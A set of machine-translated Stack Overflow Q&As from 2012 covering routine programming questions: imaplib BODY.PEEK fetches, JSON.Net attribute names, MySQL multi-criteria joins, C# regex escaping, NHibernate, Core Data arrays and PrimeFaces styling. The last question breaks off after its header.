您不能将它作为 Google Apps 小工具脚本插入吗？如果您的脚本保存在您的站点中，则它可以在要插入的小工具列表中找到，并且 UI 会显示在列表正上方的窗口中。

您可以查看[这个测试示例](https://sites.google.com/site/appsscriptexperiments/home/testlistpage)，看看它是否满足您的要求（有效的姓氏 = John、Paul、Mike...）这个示例会导致重定向，但那是因为它使用了锚点，这只是一个示例 ;-)

这不是字面意义上的“弹出窗口”，因为 UI 始终存在，但您可以通过仅显示“激活”按钮使其在不活动时不那么明显，例如，当用户需要时，该按钮会在同一窗口中触发另一个 UI它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T00:45:47.190

您可以通过（谷歌应用引擎）代理使用 iframe - 也可以删除黄色警告。

[python代理在iframe中嵌入谷歌应用脚​​本服务](https://stackoverflow.com/questions/10510425/python-proxy-to-embed-a-google-apps-script-service-in-an-iframe)

# python - imaplib/gmail 如何在不标记为已读的情况下下载完整消息（所有部分）

> ID：10991533
> 
> 赞同：5
> 
> 时间：2012-06-12T06:31:41.417
> 
> 标签：python, gmail, imaplib

我无意中将收件箱中的所有消息都标记为已阅读此 python 语句：

```
status, data = conn.uid('fetch', fetch_uids, '(RFC822)') 
```

但是我能够使用以下一组语句浏览消息的所有部分：

```
email_message = email.message_from_string(data[0][1])
for part in email_message.walk():
  print '\n'
  print 'Content-Type:',part.get_content_type()
  print 'Main Content:',part.get_content_maintype()
  print 'Sub Content:',part.get_content_subtype() 
```

输出：

```
Content-Type: multipart/mixed
Main Content: multipart
Sub Content: mixed

Content-Type: multipart/alternative
Main Content: multipart
Sub Content: alternative

Content-Type: text/plain
Main Content: text
Sub Content: plain

Content-Type: text/html
Main Content: text
Sub Content: html 
```

我发现如果我改用这个语句：

```
status, data = conn.uid('fetch', fetch_uids, '(RFC822.HEADER BODY.PEEK[1])') 
```

我不会将我所有的消息都标记为已读。但是，我也不会得到消息的所有部分：

```
Content-Type: multipart/mixed
Main Content: multipart
Sub Content: mixed 
```

我试图在[这里](http://docs.python.org/release/2.6.5/library/imaplib.html)阅读 imaplib 的手册，但没有提到“peek”这个词。我的问题是，如何在不将消息标记为已读的情况下获取消息的所有部分？谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-04-03T16:45:38.077

您也可以在只读模式下打开邮箱。选择（文件夹，只读=真）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-12T18:06:35.843

我想如果你继续尝试足够多的组合，你会找到答案：

```
status, data = conn.uid('fetch', fetch_ids, '(RFC822 BODY.PEEK[])') 
```

一路上，我在[RFC 1730 手册中找到了很多信息。](https://www.rfc-editor.org/rfc/rfc1730)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-12T18:57:01.903

我想我是在自言自语，只是以一种正式的方式。:)

我想我这次真的找到了答案：

```
status, data = conn.uid('fetch', fetch_ids, '(BODY.PEEK[])') 
```

这完成了我正在寻找的一切。它不会将消息标记为已读 (Seen)，而是检索消息的所有部分。

查看 RFC 1730 手册，这似乎应该有效：

```
status, data = conn.uid('fetch', fetch_ids, '(RFC822.PEEK BODY)') 
```

但这也产生了错误？？？

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-28T06:21:31.907

如果您只需要标头，但仍希望将消息标记为未读（UNSEEN），则需要两个命令获取然后存储：

```
# get uids of unseen messages
result, uids = conn.uid('search', None, '(UNSEEN)')

# convert these uids to a comma separated list
fetch_ids = ','.join(uids[0].split())

# first fetch the headers, this will mark them read (SEEN)
status, headers = conn.uid('fetch', fetch_ids, '(RFC822.HEADER)')

# now mark each message unread (UNSEEN)
status1, flags = conn.uid('store', fetch_ids,'-FLAGS','\\Seen') 
```

# c# - 如何在 JSON.Net 中获取 JsonProperty 的名称？

> ID：10991535
> 
> 赞同：12
> 
> 时间：2012-06-12T06:31:48.547
> 
> 标签：c#, json.net

我有这样的课：

```
[JsonObject(MemberSerialization.OptIn)]
public class foo
{
     [JsonProperty("name_in_json")]
     public string Bar { get; set; }
     // etc. 
     public Dictionary<string, bool> ImageFlags { get; set; }
} 
```

JSON 最初是从 CSV 文件生成的，每一行代表一个 foo 对象 - 它基本上是平的，所以我需要将某些键映射到 imageflags。

我尝试根据[此处](http://geekswithblogs.net/DavidHoerster/archive/2011/07/26/json.net-custom-convertersndasha-quick-tour.aspx)的示例编写一个 CustomCreationConverter 。

这似乎很好地映射了标志，但它无法设置正常属性 - 它寻找“bar”而不是“name_in_json”。

我将如何为 foo 类型的对象获取“name_in_json”值？

***编辑*****：**

当前解决方案：

```
 var custAttrs = objectType.GetProperties().Select(p =>     p.GetCustomAttributes(typeof(JsonPropertyAttribute), true)).ToArray();
 var propNames = objectType.GetProperties().Select(p => p.Name.ToLower()).ToArray();
 Dictionary<string, string> objProps = new Dictionary<string, string>();
 for (int i = 0; i < propNames.Length; i++) 
     // not every property has json equivalent...
     if (0 == custAttrs[i].Length)
     {
         continue;
     }

     var attr = custAttrs[i][0] as JsonPropertyAttribute; 
     objProps.Add(attr.PropertyName.ToLower(), propNames[i].ToLower());
 } 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2018-06-20T17:15:06.460

这是一个旧帖子，但我想建议稍微修改一下，我认为它更干净。（最近遇到了同样的问题）它使用匿名类型。

```
var pairs = objectType
    .GetProperties()
    .Select(p => new {
        Property = p,
        Attribute = p
            .GetCustomAttributes(
                typeof(JsonPropertyAttribute), true)
            .Cast<JsonPropertyAttribute>()
            .FirstOrDefault() });

var objProps = pairs
    .Where(p => p.Attribute != null)
    .ToDictionary(
        p => p.Property.Name,
        p => p.Attribute.PropertyName); 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-06-12T06:38:09.323

好的，在上面的示例中，您可以从 type 中获取所有属性名称：

```
var objProps = objectType.GetProperties().Select(p => p.Name.ToLower()).ToArray(); 
```

`JsonProperty`所以你只使用实际的属性名称，你应该做的是使用[GetCustomAttributes](http://msdn.microsoft.com/en-us/library/dwc6ew1d.aspx)方法为每个属性获取类型的自定义属性，并从中获取 json 属性名称。

# iframe - 为多个 iFrame 预加载背景图像？

> ID：10991543
> 
> 赞同：0
> 
> 时间：2012-06-12T06:32:42.573
> 
> 标签：iframe, preload

我有几个 iFrame 都使用单个背景图像。每当我单击按钮更改 iFrame 内容时，浏览器似乎总是再次加载图像，并且有几秒钟的明显延迟。有什么方法可以告诉浏览器保留该文件，以免出现白色闪烁和明显的延迟？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T06:39:38.177

使 iframe 透明，并将您的图像作为加载 iframe 的 div 的背景

# algorithm - 哪些算法难以用函数式语言实现？

> ID：10991546
> 
> 赞同：28
> 
> 时间：2012-06-12T06:32:50.973
> 
> 标签：algorithm, functional-programming, state, dynamic-programming, side-effects

我正在涉足函数式语言，我发现一些算法（尤其是那些使用动态编程的算法）更难编写，有时在最坏的情况下运行时效率更低。是否有一类算法在具有不可变变量和副作用的函数式语言中效率较低？

有没有人可以指点我的参考资料，这将有助于编写更难的算法（可能是那些通过共享状态优化的算法）？

谢谢

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2012-06-12T06:54:31.430

首先，您可能知道也可能不知道，包括 Haskell 在内的一些语言实现了共享，这缓解了您可能想到的一些问题。

虽然 Andrew 的回答指出了图灵完备性，但它并没有真正回答哪些算法*难以*在函数式语言中实现的问题。人们通常不会问哪些*算法*很难用函数式语言实现，而是会问哪些*数据结构*很难用函数式语言实现。

对此的简单回答：涉及指针的事物。

当您深入到机器级别时，没有与指针等效的功能，有一个映射，您可以安全地将某些数据结构编译为数组或实现为指针的东西，但在高级别上，您无法表达事物在命令式语言中尽可能轻松地使用基于指针的数据结构。

为了解决这个问题，已经做了很多事情：

*   由于指针构成了哈希表的基础，而且哈希表实际上只是实现了一个映射，因此已经全面研究了有效的功能映射。事实上，Chris Okasaki 有一本书（“Purely Functional Data Structures”）详细介绍了许多实现函数映射、双端队列等的方法......
*   由于指针可用于表示遍历某些较大数据结构内的节点，因此在这方面也有工作。该产品是*zipper*，一种高效的结构，简洁地代表了“更深结构内的指针”技术的功能等效。
*   由于指针可用于实现副作用计算，因此*monad*已被用来以一种漂亮的方式表达这种计算。因为跟踪状态很难处理，monad 的一个用途是让您*掩盖*程序中丑陋的命令式行为部分，并使用类型系统确保程序正确链接在一起（通过 monadic 绑定）。

虽然我*想说*任何算法都可以很容易地从命令式算法转换为函数式算法，但事实并非如此。但是，我相当确信问题不在于算法本身，而在于它们操作的数据结构，基于命令式的状态概念。[您可以在这篇文章](https://cstheory.stackexchange.com/questions/1539/whats-new-in-purely-functional-data-structures-since-okasaki)中找到一长串函数式数据结构。

所有这一切的另一面是，如果您开始使用更纯粹的函数式风格，程序中的大部分复杂性都会降低，并且对大量命令式数据结构的许多需求也会消失（例如，在命令式中非常普遍地使用指针）语言是为了实现令人讨厌的设计模式，这通常转化为在功能级别上巧妙地使用多态性和类型分类）。

编辑：我相信这个问题的本质涉及如何以功能方式表达计算。但是，应该注意的是，有一些方法可以以函数方式定义有状态计算。或者更确切地说，可以使用函数式技术来推理有状态计算。例如，[Ynot](http://ynot.cs.harvard.edu/)项目使用参数化 monad 执行此操作，其中有关堆的事实（以分离逻辑的形式）由 monadic 绑定跟踪。

顺便说一句，即使在 ML 中，我也不明白为什么动态编程*这么*难。看起来像动态编程问题，通常建立一些序列的集合来计算最终答案，可以通过函数的参数来累积构造的值，在某些情况下可能需要继续。使用尾递归，没有理由不能像命令式语言那样漂亮和高效。现在可以肯定，您可能会遇到这样的论点，即如果这些值是列表（例如），我们可以将它们实现为数组，但为此，请参阅帖子的内容：-)

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-06-14T13:57:36.530

请记住，大多数函数式语言都允许一些副作用的概念；它们可能不受欢迎，仅限于本地使用等，但您仍然可以使用它们。在 OCaml、Haskell、F#、Scala 或 Clojure 中，您可以根据需要使用可变数组。

因此，如果您发现一个算法，您有一个使用可变数组的公式，并且您需要用其中一种语言重现它，那么只需使用可变数组！

没有理由强迫自己使用单一的编程范式做所有事情；在某些问题领域，命令式编程（根据我们目前的知识）是最适合这项工作的工具，就像在某些领域逻辑编程非常出色一样。如果在本地封装使用这些范例之一可以节省您的时间和精力，那么您应该毫不犹豫地使用它们。

例如，[Eratosthenes 的筛子](http://en.wikipedia.org/wiki/Sieve_of_Eratosthenes)用可变数组实现是微不足道的，并且很难以纯函数方式模仿（合理有效地）：有关详细信息，请参阅[Melissa O'Neill](http://www.cs.hmc.edu/~oneill/papers/Sieve-JFP.pdf)文章。

另一方面，为给定问题找到不可变的解决方案可能是一项有趣且具有启发性的练习。Crhis Okasaki 的“Purely Functional Data Structures”一书是一个很好的例子，它以纯函数的方式对算法进行了非常好的重新表述。如果您对算法本身感兴趣（而不是它们对您的问题的应用），这可能是一个非常有趣的活动。

（有关使用共享来优化纯函数式算法的示例，请参阅 Richard Bird 和 Ralf Hinze 的 2003 年[函数式明珠：共享的麻烦就是麻烦减半](http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.10.1217)。）

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-06-04T19:23:46.400

可以以低渐近成本实现命令式功能，因此从抽象意义上讲，将命令式代码转换为纯函数式世界没有本质上的困难。在实践中，当然有。:-) 看看 Pippenger 的“Pure vs Impure Lisp”和[引用它的论文](http://scholar.google.com/scholar?es_sm=93&bav=on.2,or.r_qf.&bvm=bv.68235269,d.aWw,pv.xjs.s.en_US.XMJxgDRrB5E.O&biw=1562&bih=1105&um=1&ie=UTF-8&lr=&cites=13563721796912195150)。

# mysql - 使用多个条件加入查询

> ID：10991547
> 
> 赞同：0
> 
> 时间：2012-06-12T06:32:51.733
> 
> 标签：mysql, sql

我有这些桌子

```
places(place_id, place_name)
places_criteria(place_id, criterion_id)
criteria(criterion_id, criterion_name) 
```

“places_criteria”有“places”和“criteria”的外键。我可以通过一个标准获得很多地方。

```
SELECT p.place_id, p.place_name
FROM places p INNER JOIN places_criteria pc ON p.place_id = pc.place_id
WHERE pc.criterion_id = < some_id > 
```

**如何通过多个标准获得许多地方？**

**例如**：迪士尼乐园是一个地方（place_id = 1），它是“好”（criterion_id = 1）和“有趣”（criterion_id = 2）。

places_criteria 的数据：

```
place_id   criterion_id
1            1
1            2 
```

现在我想获得“好”和“有趣”的地方。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T07:01:01.450

硬编码版本是为您需要的每个标准加入表格本身......

```
SELECT
  c1.place_id
FROM
  places_criteria      AS c1
INNER JOIN
  places_criteria      AS c2
    ON c2.place_id = c1.place_id
WHERE
      c1.criterion_id = 1
  AND c2.criterion_id = 2 
```

这很有效，但如果要查询动态数量的criteria_id，则需要动态SQL。

另一种方法是使用`IN (1,2)` *（或连接等，以执行类似的功能）*来获得答案`Places with criterion 1 <OR> 2`，然后使用`HAVING`子句仅包含具有两个不同标准的地方。

```
SELECT
  place_id
FROM
  places_criteria
WHERE
  criterion_id IN (1,2)
GROUP BY
  place_id
HAVING
  COUNT(DISTINCT criterion_id) = 2 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-12T06:37:33.617

你可以这样做 ：

```
SELECT p.place_id, p.place_name
FROM places p, places_criteria pc1, places_criteria pc2, places_criteria pc3
WHERE p.place_id = pc2.place_id and pc1.criterion_id = < some_id >
and  p.place_id = pc2.place_id and pc2.criterion_id = < some_id >
and p.place_id = pc3.place_id and pc3.criterion_id = < some_id > 
```

但我对你的问题的理解有疑问：你为什么要给我们看这张`criteria`桌子？

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-12T06:40:12.293

用于`in`从集合中选择。您可以使用子选择来获取正确的地点 ID，也可以`distinct`像我一样使用，这在 MySQL 中可能会更快一些。

```
select distinct
  p.place_id,
  p.place
from
  places p
  inner join places_criteria pc on pc.place_id = p.place_id
  inner join criteria c on c.criterion_id = pc.criterion_id
where
  /* Either by name */
  c.criterion_name in ('crit A', 'crit B', 'crit C')
  /* Or by id */
  OR c.criterion_id in (1, 2, 3, 4, 5) 
```

解决方案 2\. 匹配所有标准。通过检查计数来做到这一点。

```
select
  p.place_id,
  p.place
from
  places p
  inner join places_criteria pc on pc.place_id = p.place_id
  inner join criteria c on c.criterion_id = pc.criterion_id
where
  c.criterion_name in ('crit A', 'crit B', 'crit C')
group by 
  p.place_id,
  p.place
having
  count(*) = 3 /* the number of criteria */ 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-12T06:41:17.437

如果您想要所有满足以下条件之一的地方：

```
SELECT p.place_id, p.place_name
FROM places p
INNER JOIN places_criteria pc ON p.place_id = pc.place_id
WHERE pc.criterion_id = < some_id >
OR pc.criterion_id = < some_id2 >
OR pc.criterion_id = < some_id3 >
GROUP BY p.place_id, p.place_name 
```

如果您想要满足所有几个条件的所有地方：

```
SELECT p.place_id, p.place_name
FROM places p
INNER JOIN places_criteria pc1 ON p.place_id = pc1.place_id
INNER JOIN places_criteria pc2 ON p.place_id = pc2.place_id
INNER JOIN places_criteria pc3 ON p.place_id = pc3.place_id
WHERE pc1.criterion_id = < some_id >
AND pc2.criterion_id = < some_id2 >
AND pc3.criterion_id = < some_id3 > 
```

# iphone - iphone 开发人员从 iphone 应用程序向 Linkedin 发送帖子

> ID：10991560
> 
> 赞同：2
> 
> 时间：2012-06-12T06:34:05.127
> 
> 标签：iphone, objective-c, linkedin

我想从我的 iphone 应用程序在linkedin 上发帖，任何人都可以通过某种教程网址等指导我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T10:57:53.540

看看[Linkedin API](https://developer.linkedin.com/rest) 和[RestKit](http://restkit.org/)

将两者结合起来，你很高兴知道。如果您学习有关 restKit 的教程并将示例链接替换为 linkedin api 链接，那么您已经拥有了所需的内容。

# javascript - 为什么解析 css 失败以及如何在浏览器中成功测试解析 css

> ID：10991561
> 
> 赞同：0
> 
> 时间：2012-06-12T06:34:05.867
> 
> 标签：javascript, css

我有一个下载的 css 文件，它的大小还可以
但在某些情况下（我不知道），它只是无法工作
是字符集导致的（有些评论是中文的）还是有任何触发器？
以及如何测试所有规则解析是否正确？
我遇到了一个常见的想法：
在这个 css 文件的底部添加一个 css 规则，例如：并测试具有 class宽度`.testCss{width:1px}`的元素是否为 1px 我的另一个问题是？ 有什么解决方案可以解决这个问题吗？ 谢谢！ `.testCss`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T06:36:18.810

要解析 CSS，请转到[W3C CSS 验证器](http://jigsaw.w3.org/css-validator/)

如果您使用 unicode 字符，可能需要`@charset "UTF-8";`在文件顶部指定。在 CSS 规范中[阅读](http://www.w3.org/TR/CSS2/syndata.html#charset)有关 CSS 中数据类型的更多信息。

要检查特定元素是否具有正确的属性，请使用 Firefox 中的 firebug（如@dbaseman 所述）或 Safari 和 Chrome 具有内置的检查器。您可以右键单击元素并单击“检查”。

您可以按如下方式查看 CSS：

![在此处输入图像描述](../Images/5683e1a90cff3c89990221240c252dcf.png)

# c# - 在 C# 中的字符串中查找指定字符串的所有索引

> ID：10991568
> 
> 赞同：2
> 
> 时间：2012-06-12T06:34:19.893
> 
> 标签：c#, regex

嗨，我正在尝试使用解决方案

[在 C# 中查找字符串中的所有模式索引](https://stackoverflow.com/questions/10546302/find-all-pattern-indexes-in-string-in-c-sharp)

但是，它不适用于我的情况

```
string sentence = "A || ((B && C) || E && F ) && D || G";
string pattern = "(";
IList<int> indeces = new List<int>();
foreach (Match match in Regex.Matches(sentence, pattern))
{
  indeces.Add(match.Index);
} 
```

它产生错误，“解析”（“ - 不够）”。

我不确定我在这里做错了什么。

感谢任何帮助。

谢谢，

巴兰辛尼亚

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-12T06:37:24.053

> 我不确定我在这里做错了什么。

您忘记了它`(`在正则表达式中具有特殊含义。如果你使用

```
string pattern = @"\("; 
```

它应该工作，我相信。或者，只要`string.IndexOf`你没有真正使用正则表达式的模式匹配，就继续使用。

如果您*要*使用正则表达式，我会亲自创建一个`Regex`对象，而不是使用静态方法：

```
Regex pattern = new Regex(Regex.Escape("("));
foreach (Match match in pattern.Matches(sentence))
... 
```

这样一来，关于哪个参数是输入文本以及哪个是模式的混淆范围就比较小了。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-12T06:35:51.510

在这上面使用正则表达式是多余的——IndexOf 就足够了。

```
string sentence = "A || ((B && C) || E && F ) && D || G";
string pattern = "(";
IList<int> indeces = new List<int>();
int index = -1;
while (-1 != (index = sentence.IndexOf('(', index+1)))
{
  indeces.Add(index);
} 
```

或者，在您的情况下，您需要转义`(`，因为它是正则表达式的特殊字符，所以模式将是`"\\("`

编辑：修复，谢谢科比

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-12T06:36:01.273

你必须逃避`(`.

换句话说：

```
string pattern = "\\("; 
```

# javascript - 无法让 Facebook 应用发布到流媒体

> ID：10991574
> 
> 赞同：0
> 
> 时间：2012-06-12T06:34:42.343
> 
> 标签：javascript, facebook

提前感谢您的帮助！

我一直在尝试为我的网站构建一个应用程序，以便用户可以登录该应用程序，它会跟踪他们查看的网站上的页面并将这些故事发布到他们的时间线。我在我的页面上使用下面的 JS 代码。该应用程序似乎正确地允许用户登录该应用程序和所有内容，但尽管已将 publish_stream 设置为权限，但它从未向他们的提要发布任何内容。此外，当我以隐身方式访问我的应用程序的链接时，我只能选择“转到应用程序”或“取消”。然后，当我单击“转到应用程序”时，它无需请求任何许可即可运行。那么我是否在我的网站上遗漏了某种代码？我也没有在应用中心提交应用。为了让应用程序正常工作，这是必要的吗？

我真的很感谢这里的任何帮助！我是新手，所以我真的可以使用帮助。

谢谢！担

```
</script>

<div id="fb-root"></div>
<script>
      window.fbAsyncInit = function() {
        FB.init({
          appId      : '1665908668*****',
          status     : true, 
          cookie     : true,
          xfbml      : true,
          oauth      : true,
        });
      };

   (function(d){
         var js, id = 'facebook-jssdk'; if (d.getElementById(id)) {return;}
         js = d.createElement('script'); js.id = id; js.async = true;
         js.src = "//connect.facebook.net/en_US/all.js";
         d.getElementsByTagName('head')[0].appendChild(js);
       }(document));
    </script> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T08:18:14.983

> 该应用程序似乎正确地允许用户登录该应用程序和所有内容，但尽管已将 publish_stream 设置为权限，但它从未向他们的提要发布任何内容。

您的应用必须*主动*发布帖子……请参阅[https://developers.facebook.com/docs/reference/api/user/#feed](https://developers.facebook.com/docs/reference/api/user/#feed)

> 然后，当我单击“转到应用程序”时，它无需请求任何许可即可运行。

再一次，如果你想让它发生，你必须积极地这样做。或者您可以尝试使用[身份验证的推荐](https://developers.facebook.com/docs/opengraph/authentication/#referrals)，这将在某些情况下提示用户在进入您的应用程序之前授予权限。

# java - CSS表达式不适用于primefaces

> ID：10991576
> 
> 赞同：0
> 
> 时间：2012-06-12T06:34:50.793
> 
> 标签：java, css, jsf-2, primefaces

下面的代码不起作用，但它适用于 jsf1.2。现在框架是jsf2.0和primefaces 3.2

```
<p:inputText id="pInputText4"  disabled="true" value="This is Input
Text" style="color:
expression((this.disabled==true)?'#0f0':'#f00');"/> 
```

我还有一个问题，为什么

```
<p:selectOneMenu id="roleId" value="#{accessPage.roleId}" required="true">
   <f:selectItem itemLabel="#{msg['label.common.selecthere']}" itemValue="#{null}" />
   <f:selectItems var="code" value="#{accessPage.roleIdList}"   
       itemLabel="#{code.codeDesc}" itemValue="#{code.codeId}" />
   <f:valueChangeListener type="com.ncs.caseconnect.base.app.utils.ValueChangeCleanUtils"/>
   <p:ajax listener="#{accessPage.roleOrModuleChanged}" update="accessRight" />
</p:selectOneMenu> 
```

当我们选择第一个 null 选项时，valueChangeListener 和 ajax 不起作用。如果我们删除所需的属性，它工作正常。required 和 valueChangeListener 之间是否冲突？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T12:01:22.163

您可以`#{component}`在任何组件的属性中使用来获取当前组件的具体`UIComponent`实例。这解决了`<p:inputText>`一个实例的情况，该实例[`UIInput`](http://docs.oracle.com/javaee/6/api/javax/faces/component/UIInput.html)又具有一个`boolean disabled`属性。所以，这应该这样做：

```
<p:inputText id="pInputText4" disabled="true" value="This is Input Text" 
    style="color: #{component.disabled ? '#0f0' : '#f00'};" /> 
```

但更好的做法是在 CSS 文件中定义样式，而不是直接在标记中定义样式，因为这样可以消除重复和维护问题。

```
<p:inputText id="pInputText4" disabled="true" value="This is Input Text" 
    styleClass="foo" /> 
```

和

```
.foo {
    color: #f00;
}

.foo[disabled] {
    color: #0f0;
} 
```

或者，如果您想在所有输入元素上全局应用它

```
<p:inputText id="pInputText4" disabled="true" value="This is Input Text" /> 
```

和

```
input {
    color: #f00;
}

input[disabled] {
    color: #0f0;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T06:49:03.467

我猜你最终会使用`disabled="#{someBean.someCondition}"`

在这种情况下，您将不得不`style`像这样在您的 m中使用 EL 表达式

```
<p:inputText id="pInputText4"  disabled="#{someBean.someCondition}" value="This is Input
    Text" style="color:#{someBean.someCondition ?'#0f0':'#f00'}"/> 
```

不知道`expression`，但你确定你可以访问`this`，这`this.disabled`真的给了你`disabled`属性的价值吗？（尝试在 中显示`alert(this.disabled)`）

# matlab - MATLAB中的二进制数组

> ID：10991577
> 
> 赞同：3
> 
> 时间：2012-06-12T06:34:51.950
> 
> 标签：matlab, vector, binary

如果我有一个包含 20 个数字的初始数组 A，顺序为 1 到 20，

```
 A = [1,2,3,4,5,...,20] 
```

并有另一个随机数组 B：

```
 B = [1, 15, 3, 20, 7] 
```

并希望输出形式为的列向量 C

```
 C = [1 0 1 0 0 0 1 0 0 0 0 0 0 0 1 0 0 0 0 1] 
```

请注意，C 在 B 具有值的索引处具有 1。

我尝试了以下方法：

```
n=20;
C = zeros(n, 1);
for i=1:length(B)
   C(B(i))=1;
end 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T07:39:22.247

单线：

```
full(sparse(B,1,1,max(B),1)) 
```

你也可以放弃[完整](http://www.mathworks.nl/help/techdoc/ref/full.html)的功能，大多数matlab矩阵运算都可以处理稀疏矩阵。但当然，这取决于你真正想要做什么。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-12T13:03:23.370

另一个单行：

```
C = accumarray(B(:), 1, [], @(x)1) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-12T06:46:12.097

这是一个矢量化的解决方案：

首先，初始化`C`

```
 C = zeros( max(B),1); 
```

然后使用数组索引：

```
 C(B) = 1; 
```

# c# - 分区c#上的休眠行号

> ID：10991586
> 
> 赞同：4
> 
> 时间：2012-06-12T06:36:13.990
> 
> 标签：c#, nhibernate, nhibernate-criteria, row-number

我是 nhibernate 的新手，需要你的帮助。

如何在 nhibernate-criteria C# 中执行此 sql 查询

```
select * from
(
 select *, row_number() over (partition by questionaireId order by stepnumber desc) rid
 from myTable 
) t
where t.rid=1 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-27T17:52:41.743

首先，小提示：`Select *`不起作用，所有列都必须显式命名。其次，我不确定您要达到什么目的。如果这应该进行某种寻呼，我有更好的建议**（*下面的第 2*条）**。但是，让我们先尝试做你想做的事。

**1）**因此，考虑到我们应该明确选择列，这是一种如何将 SQL 语句转换为 Criteria 语法的方法：

```
var list = session
  .CreateCriteria<MyEntity>() // mapped to 'myTable' table 
  .SetProjection
  (
       Projections.SqlProjection
       (        
          "Code, Name, row_number() over (partition by questionaireId order by stepnumber desc) as rid"
          , new string[] {"Code", "Name"}
          , new IType[] { NHibernate.NHibernateUtil.String
                     , NHibernate.NHibernateUtil.String }
       )
  )
  .SetMaxResults(1)  // this is something like t.rid = 1
  .SetResultTransformer(Transformers.AliasToBean<MyEntity>())
  .List<MyEntity>()
; 
```

如果您的映射类`MyEntity`具有属性`Code`并且`Name`...这将像这样执行选择：

```
SELECT TOP 1 Code, Name
 , row_number() over (partition by questionaireId order by stepnumber desc) rid
 FROM myTable 
```

并且在执行时，结果将绑定到属性（代码、名称）中，并且仅选择按您的子句排序的第一行。

**2) 原生 NHibernate 分页**

因为您已经提到：*我是 NHibernate 的新手，*我猜您正在尝试基于 Order By 属性进行分页。如果是这种情况，您的解决方案要简单得多。使用此标准：

```
var list = session
  .CreateCriteria<MyEntity>()
  .AddOrder(new Order("stepnumber", false)) // the property to be used for ORDER BY
  .Add(... where conditions ala ICriterion
  ...
  .SetFirstResult(100)                      // skip 100 rows
  .SetMaxResults(20)                        // take 20 rows
  .List<Country>(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T06:39:50.797

据我所知，你不能做分区。但是，您可以在视图中创建查询，并从 NHibernate 执行该视图。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T15:53:04.923

命名查询可能有用，请参阅 NHibernate 参考。

# iphone - 获取 nsmutable 数组时出错

> ID：10991588
> 
> 赞同：0
> 
> 时间：2012-06-12T06:36:18.467
> 
> 标签：iphone, core-data, nsmutablearray, xcode4.2, nsarray

我在我的应用程序中使用 coredata 来存储和检索值。我想使用 NSMutableArray 但是

```
AppDelegate *appDelegate = [[UIApplication sharedApplication]delegate];
NSManagedObjectContext *context = [appDelegate managedObjectContext];
NSEntityDescription *entityDesc = [NSEntityDescription entityForName:@"NewExpense" inManagedObjectContext:context];
NSFetchRequest *fetchRequest = [[NSFetchRequest alloc]init];
[fetchRequest setEntity:entityDesc];
NSError *error; 
```

//我在下面的行中遇到错误，其中 self.newArray 是 NSMutableArray

```
self.newArray = [[context executeFetchRequest:fetchRequest error:&error]retain];
[fetchRequest release]; 
```

它说不兼容的指针类型从 nsarray 分配给 nsmutablearray。

但是如果我在编辑表格视图时将它声明为一个数组，那么排序将不起作用，因为它们需要一个 nsmutablearray。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T06:41:30.813

做这个：

```
 self.newArray = [[context executeFetchRequest:fetchRequest error:&error]mutableCopy] 
```

希望有帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T06:42:09.750

这是因为 executeFetch 返回一个不可变数组。

采用：`[NSMutableArray arrayWithArray:...];`

# c# - 我添加了一个项目作为参考，但仍然找不到

> ID：10991595
> 
> 赞同：0
> 
> 时间：2012-06-12T06:37:17.843
> 
> 标签：c#, visual-studio-2010, dependencies

我正在使用 VS10 和 C#，但遇到了一个奇怪的问题。我有 2 个项目 A 和 B，A 是一个类库，B 是一个控制台项目。B依赖A，所以我把A的项目引用加到了B。

但是当我在项目 B 中使用项目 A 中创建的类型时，VS 会抱怨以下内容：

> 找不到类型或命名空间名称（您是否缺少 using 指令或程序集引用？）

我以前从来没有遇到过这个问题，有人知道出了什么问题吗？

谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-12T06:52:21.663

`Client Profile`由于在为此构建库时您有项目 B 目标，`4.0`因此无法完成。

您必须将控制台应用程序升级为目标`4.0`

[MSDN](http://msdn.microsoft.com/en-us/library/cc656912.aspx)

> 如果您的目标是 .NET Framework 4 客户端配置文件，则不能引用不在 .NET Framework 4 客户端配置文件中的程序集。相反，您必须以 .NET Framework 4 为目标。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T06:55:33.147

可能有这些原因之一。

1.  您的 using namespace 语句不是指向
    使用 B 项目中的类的位置。
2.  您在项目 a 中的 classA 无法
    从项目 b 访问，因此请将它们公开。
3.  您正在指向 dotnet 框架的不同配置文件。
4.  项目 b 无法读取项目 a 的 dll。交叉检查refrance。

# blackberry - 如何将数据存储在向量中？

> ID：10991600
> 
> 赞同：-1
> 
> 时间：2012-06-12T06:37:35.877
> 
